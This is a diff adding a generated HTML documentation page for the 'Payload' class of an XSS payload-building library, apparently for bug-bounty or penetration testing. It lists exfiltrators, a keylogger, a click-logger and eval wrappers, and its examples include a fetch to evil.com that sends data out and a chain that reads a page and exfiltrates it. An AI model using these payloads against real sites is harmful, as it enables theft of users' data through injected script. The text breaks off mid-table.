@@ -1,0 +1,7038 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Payload - Documentation</title>
+
+    <script src="scripts/prettify/prettify.js"></script>
+    <script src="scripts/prettify/lang-css.js"></script>
+    <script src="scripts/graphs.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+    <link type="text/css" rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <link type="text/css" rel="stylesheet" href="styles/prettify-tomorrow.css">
+    <link type="text/css" rel="stylesheet" href="styles/graph.css">
+    <link type="text/css" rel="stylesheet" href="styles/jsdoc-default.css">
+</head>
+<body>
+
+<input type="checkbox" id="nav-trigger" class="nav-trigger" />
+<label for="nav-trigger" class="navicon-button x">
+  <div class="navicon"></div>
+</label>
+
+<label for="nav-trigger" class="overlay"></label>
+
+<nav class="nav">
+    <h2><a href="index.html">Home</a></h2><h3>Modules</h3><ul><li><a href="module-utils.html">utils</a><ul class='methods'><li data-type='method'><a href="module-utils.html#.buildUrl">buildUrl</a></li><li data-type='method'><a href="module-utils.html#.createElement">createElement</a></li><li data-type='method'><a href="module-utils.html#.createFrame">createFrame</a></li><li data-type='method'><a href="module-utils.html#.loadUglify">loadUglify</a></li><li data-type='method'><a href="module-utils.html#.randInt">randInt</a></li></ul></li></ul><h3>Classes</h3><ul><li><a href="ClickJacker.html">ClickJacker</a><ul class='methods'><li data-type='method'><a href="ClickJacker.html#addStep">addStep</a></li><li data-type='method'><a href="ClickJacker.html#run">run</a></li></ul></li><li><a href="Exfiltrators.html">Exfiltrators</a><ul class='methods'><li data-type='method'><a href="Exfiltrators.html#.console">console</a></li><li data-type='method'><a href="Exfiltrators.html#.get">get</a></li><li data-type='method'><a href="Exfiltrators.html#.iframe">iframe</a></li><li data-type='method'><a href="Exfiltrators.html#.img">img</a></li><li data-type='method'><a href="Exfiltrators.html#.message">message</a></li><li data-type='method'><a href="Exfiltrators.html#.post">post</a></li><li data-type='method'><a href="Exfiltrators.html#.postJSON">postJSON</a></li><li data-type='method'><a href="Exfiltrators.html#.sendBeacon">sendBeacon</a></li><li data-type='method'><a href="Exfiltrators.html#.style">style</a></li></ul></li><li><a href="MessageHandler.html">MessageHandler</a><ul class='methods'><li data-type='method'><a href="MessageHandler.html#addListener">addListener</a></li><li data-type='method'><a href="MessageHandler.html#listen">listen</a></li><li data-type='method'><a href="MessageHandler.html#logMessages">logMessages</a></li><li data-type='method'><a href="MessageHandler.html#removeListener">removeListener</a></li><li data-type='method'><a href="MessageHandler.html#stop">stop</a></li><li data-type='method'><a href="MessageHandler.html#waitForMessage">waitForMessage</a></li></ul></li><li><a href="Payload.html">Payload</a><ul class='methods'><li data-type='method'><a href="Payload.html#.new">new</a></li><li data-type='method'><a href="Payload.html#addExfiltrator">addExfiltrator</a></li><li data-type='method'><a href="Payload.html#asDOM">asDOM</a></li><li data-type='method'><a href="Payload.html#eval">eval</a></li><li data-type='method'><a href="Payload.html#exfiltrate">exfiltrate</a></li><li data-type='method'><a href="Payload.html#fetch">fetch</a></li><li data-type='method'><a href="Payload.html#fetchDOM">fetchDOM</a></li><li data-type='method'><a href="Payload.html#fetchJSON">fetchJSON</a></li><li data-type='method'><a href="Payload.html#fetchText">fetchText</a></li><li data-type='method'><a href="Payload.html#findBetween">findBetween</a></li><li data-type='method'><a href="Payload.html#forEach">forEach</a></li><li data-type='method'><a href="Payload.html#guard">guard</a></li><li data-type='method'><a href="Payload.html#injectStyle">injectStyle</a></li><li data-type='method'><a href="Payload.html#log">log</a></li><li data-type='method'><a href="Payload.html#map">map</a></li><li data-type='method'><a href="Payload.html#parallel">parallel</a></li><li data-type='method'><a href="Payload.html#passthru">passthru</a></li><li data-type='method'><a href="Payload.html#persist">persist</a></li><li data-type='method'><a href="Payload.html#postMessage">postMessage</a></li><li data-type='method'><a href="Payload.html#postMultipart">postMultipart</a></li><li data-type='method'><a href="Payload.html#querySelector">querySelector</a></li><li data-type='method'><a href="Payload.html#querySelectorAll">querySelectorAll</a></li><li data-type='method'><a href="Payload.html#redirect">redirect</a></li><li data-type='method'><a href="Payload.html#regExtract">regExtract</a></li><li data-type='method'><a href="Payload.html#setExfiltrator">setExfiltrator</a></li><li data-type='method'><a href="Payload.html#startClickLogger">startClickLogger</a></li><li data-type='method'><a href="Payload.html#startKeyLogger">startKeyLogger</a></li><li data-type='method'><a href="Payload.html#wait">wait</a></li></ul></li><li><a href="Wrapper.html">Wrapper</a><ul class='methods'><li data-type='method'><a href="Wrapper.html#.new">new</a></li><li data-type='method'><a href="Wrapper.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_HTML.html">Wrapper_HTML</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTML.html#append">append</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_HTML.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_HTML.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_HTML.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTML.html#innerHTML">innerHTML</a></li><li data-type='method'><a href="Wrapper_HTML.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_HTML.html#wrap">wrap</a></li><li data-type='method'><a href="Wrapper_HTML.html#write">write</a></li></ul></li><li><a href="Wrapper_HTMLDataUrl.html">Wrapper_HTMLDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#windowOpen">windowOpen</a></li><li data-type='method'><a href="Wrapper_HTMLDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JS.html">Wrapper_JS</a><ul class='methods'><li data-type='method'><a href="Wrapper_JS.html#append">append</a></li><li data-type='method'><a href="Wrapper_JS.html#appendScript">appendScript</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl">dataUrl</a></li><li data-type='method'><a href="Wrapper_JS.html#dataUrl64">dataUrl64</a></li><li data-type='method'><a href="Wrapper_JS.html#enclose">enclose</a></li><li data-type='method'><a href="Wrapper_JS.html#evalB64">evalB64</a></li><li data-type='method'><a href="Wrapper_JS.html#evalStringForCharCode">evalStringForCharCode</a></li><li data-type='method'><a href="Wrapper_JS.html#imgError">imgError</a></li><li data-type='method'><a href="Wrapper_JS.html#inputFocus">inputFocus</a></li><li data-type='method'><a href="Wrapper_JS.html#minify">minify</a></li><li data-type='method'><a href="Wrapper_JS.html#prepend">prepend</a></li><li data-type='method'><a href="Wrapper_JS.html#script">script</a></li><li data-type='method'><a href="Wrapper_JS.html#svgLoad">svgLoad</a></li><li data-type='method'><a href="Wrapper_JS.html#templateString">templateString</a></li><li data-type='method'><a href="Wrapper_JS.html#url">url</a></li><li data-type='method'><a href="Wrapper_JS.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSDataUrl.html">Wrapper_JSDataUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSDataUrl.html#script">script</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#scriptImport">scriptImport</a></li><li data-type='method'><a href="Wrapper_JSDataUrl.html#wrap">wrap</a></li></ul></li><li><a href="Wrapper_JSUrl.html">Wrapper_JSUrl</a><ul class='methods'><li data-type='method'><a href="Wrapper_JSUrl.html#embed">embed</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#iframe">iframe</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#object">object</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#redirect">redirect</a></li><li data-type='method'><a href="Wrapper_JSUrl.html#wrap">wrap</a></li></ul></li></ul>
+</nav>
+
+<div id="main">
+    
+    <h1 class="page-title">Payload</h1>
+    
+
+    <!--container.tmpl-->
+
+
+
+
+
+<section>
+
+
+
+<header data-tmpl="container.tmpl">
+    
+        <h2>
+        Payload
+        </h2>
+        
+            <div class="lead"><p>A payload object</p></div>
+        
+    
+
+    
+      <div class="bs-callout bs-callout-default">
+        <h5>Members</h5>
+        <br />
+        <dl class="dl-horizontal methods-members">
+        <dt>Methods</dt><dd><ul>
+            <li><a href="#new">new</a></li>
+            
+            <li><a href="#addExfiltrator">addExfiltrator</a></li>
+            
+            <li><a href="#asDOM">asDOM</a></li>
+            
+            <li><a href="#eval">eval</a></li>
+            
+            <li><a href="#exfiltrate">exfiltrate</a></li>
+            
+            <li><a href="#fetch">fetch</a></li>
+            
+            <li><a href="#fetchDOM">fetchDOM</a></li>
+            
+            <li><a href="#fetchJSON">fetchJSON</a></li>
+            
+            <li><a href="#fetchText">fetchText</a></li>
+            
+            <li><a href="#findBetween">findBetween</a></li>
+            
+            <li><a href="#forEach">forEach</a></li>
+            
+            <li><a href="#guard">guard</a></li>
+            
+            <li><a href="#injectStyle">injectStyle</a></li>
+            
+            <li><a href="#log">log</a></li>
+            
+            <li><a href="#map">map</a></li>
+            
+            <li><a href="#parallel">parallel</a></li>
+            
+            <li><a href="#passthru">passthru</a></li>
+            
+            <li><a href="#persist">persist</a></li>
+            
+            <li><a href="#postMessage">postMessage</a></li>
+            
+            <li><a href="#postMultipart">postMultipart</a></li>
+            
+            <li><a href="#querySelector">querySelector</a></li>
+            
+            <li><a href="#querySelectorAll">querySelectorAll</a></li>
+            
+            <li><a href="#redirect">redirect</a></li>
+            
+            <li><a href="#regExtract">regExtract</a></li>
+            
+            <li><a href="#setExfiltrator">setExfiltrator</a></li>
+            
+            <li><a href="#startClickLogger">startClickLogger</a></li>
+            
+            <li><a href="#startKeyLogger">startKeyLogger</a></li>
+            
+            <li><a href="#wait">wait</a></li>
+            </ul></dd></dl></div>
+</header>
+
+<article>
+    <div class="container-overview">
+    
+        <!--method.tmpl-->
+<div class="method-details">
+
+
+
+
+
+    
+    <h3 class="constructor">Constructor</h3>
+    
+
+    
+      <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line11">11</a>
+  </code>
+</div>
+
+    
+
+    <h4 class="name" id="Payload">
+      <a href="#params-Payload"><span class="type-signature"></span>new Payload</a><span class="signature">(parent<span class="signature-attributes">opt</span>, render<span class="signature-attributes">opt</span>)</span><span class="type-signature"></span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Used internally<br>
+Use <a href="Payload.html#.new"><code>Payload.new()</code></a> instead.</p>
+</div>
+
+
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-Payload">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-Payload" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>parent</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>Parent payload</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>render</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>Render function for the payload</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n * A payload object\n * @param {Payload} [parent=null] Parent payload\n * @param {function} [render=null] Render function for the payload\n * @class\n */","meta":{"range":[217,32578],"filename":"Payload.js","lineno":11,"columnno":0,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001200","name":"Payload","type":"ClassDeclaration","paramnames":["parent","render"]},"shortpath":"Payload.js"},"name":"Payload","longname":"Payload","kind":"class","classdesc":"<p>A payload object</p>","scope":"global","description":"<p>Used internally<br>\nUse <a href="Payload.html#.new"><code>Payload.new()</code></a> instead.</p>","params":[{"type":{"names":["Payload"]},"optional":true,"defaultvalue":null,"description":"<p>Parent payload</p>","name":"parent"},{"type":{"names":["function"]},"optional":true,"defaultvalue":null,"description":"<p>Render function for the payload</p>","name":"render"}],"___id":"T000003R000005","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"Payload","signature":"<span class=\"signature\">(parent<span class=\"signature-attributes\">opt</span>, render<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"></span>","ancestors":[]}
+</pre>
+-->
+</div>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+     
+
+    
+
+    
+
+    
+        <h3 class="subsection-title">Methods</h3>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line30">30</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id=".new">
+      <a href="#params-new"><span class="type-signature">(static) </span>new</a><span class="signature">()</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Return a new <a href="Payload.html"><code>Payload</code></a> object.</p><script type="graph">[{"readType":null,"label":"Payload.new()","children":null,"returnType":""},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-new">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Return a new <a href="Payload.html"><code>Payload</code></a> object.\n     * @graph ($current) {} -> $Payload\n     * @returns {Payload}\n     */","meta":{"range":[724,773],"filename":"Payload.js","lineno":30,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001230","name":"Payload.new","type":"MethodDefinition","paramnames":<a href="Payload.html"><code>]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Return a new [Payload</code></a> object.</p><script type=\"graph\">[{\"readType\":null,\"label\":\"Payload.new()\",\"children\":null,\"returnType\":\"\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":null,"label":"Payload.new()","children":null,"returnType":""},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"returns":[{"type":{"names":["Payload"]}}],"name":"new","longname":"Payload.new","kind":"function","memberof":"Payload","scope":"static","params":[],"___id":"T000002R000125","___s":true,"attribs":"<span class=\"type-signature\">(static) </span>","id":".new","signature":"<span class=\"signature\">()</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>."]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line254">254</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="addExfiltrator">
+      <a href="#params-addExfiltrator"><span class="type-signature"></span>addExfiltrator</a><span class="signature">(exfiltrator)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Add an exfiltrator to use when <code>exfiltrate</code> is called.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"addExfiltrator(exfiltrator)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p new Payload()
+            .addExfiltrator(x => fetch('https://evil.com/?' + x))
+            .addExfiltrator(exfiltrators.message())
+            .eval(x=>42)
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-addExfiltrator">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-addExfiltrator" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>exfiltrator</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"><p>exfiltrator to use.
+exfiltrator is a function that take the data to exfiltrate and do something with it.</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Add an exfiltrator to use when <code>exfiltrate</code> is called.\n    * @graph $Payload -> ($current) -> $Payload\n    * @param {function|Payload} exfiltrator exfiltrator to use.\n    * exfiltrator is a function that take the data to exfiltrate and do something with it.\n    * @example\n    * const p new Payload()\n    *             .addExfiltrator(x => fetch('https://evil.com/?' + x))\n    *             .addExfiltrator(exfiltrators.message())\n    *             .eval(x=>42)\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[8963,9125],"filename":"Payload.js","lineno":254,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001702","name":"Payload#addExfiltrator","type":"MethodDefinition","paramnames":["exfiltrator"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Add an exfiltrator to use when <code>exfiltrate</code> is called.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"addExfiltrator(exfiltrator)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"addExfiltrator(exfiltrator)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["function","Payload"]},"description":"<p>exfiltrator to use.\nexfiltrator is a function that take the data to exfiltrate and do something with it.</p>","name":"exfiltrator"}],"examples":[{"caption":"","code":"const p new Payload()\n            .addExfiltrator(x => fetch('https://evil.com/?' + x))\n            .addExfiltrator(exfiltrators.message())\n            .eval(x=>42)\n            .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"addExfiltrator","longname":"Payload#addExfiltrator","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000151","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"addExfiltrator","signature":"<span class=\"signature\">(exfiltrator)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line445">445</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="asDOM">
+      <a href="#params-asDOM"><span class="type-signature"></span>asDOM</a><span class="signature">(lang<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Take the pipe value, parse it as html or xml and set the result as the pipe value.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String","label":"asDOM(lang=\"text/html\")","children":null,"returnType":"Document"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchText("/")
+              .asDOM()
+              .querySelector("title", "innerText")
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-asDOM">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-asDOM" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>lang</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    "text/html"
+                
+                </td>
+            
+
+            <td class="description last"><p>Language to use for the parser,</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take the pipe value, parse it as html or xml and set the result as the pipe value.\n     *\n     * @param {string}[lang=\"text/html\"] Language to use for the parser,\n     * @graph $Payload -> {String} ($current) {Document} -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .fetchText(\"/\")\n     *               .asDOM()\n     *               .querySelector(\"title\", \"innerText\")\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[16282,16401],"filename":"Payload.js","lineno":445,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002015","name":"Payload#asDOM","type":"MethodDefinition","paramnames":["lang"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take the pipe value, parse it as html or xml and set the result as the pipe value.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String\",\"label\":\"asDOM(lang=\\\"text/html\\\")\",\"children\":null,\"returnType\":\"Document\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string"]},"optional":true,"defaultvalue":"\"text/html\"","description":"<p>Language to use for the parser,</p>","name":"lang"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String","label":"asDOM(lang=\"text/html\")","children":null,"returnType":"Document"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchText(\"/\")\n              .asDOM()\n              .querySelector(\"title\", \"innerText\")\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"asDOM","longname":"Payload#asDOM","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000161","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"asDOM","signature":"<span class=\"signature\">(lang<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line63">63</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="eval">
+      <a href="#params-eval"><span class="type-signature"></span>eval</a><span class="signature">(code_or_func, &hellip;args)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>This add a function to eval to the payload,
+the function take the value in the pipe as an argument named _
+the value returned by the function is then passed in the pipe</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"eval(code_or_func, ...args)","children":null,"returnType":"Any"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .eval(()=>42)      # pipe value set to 42
+              .eval(x=>alert(x))  # alert 42
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-eval">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-eval" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>code_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+|
+
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+
+            <td class="description last"><p>to eval on the target,
+if code_or_func is a function, then is converted to string.</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>args</code></td>
+            
+
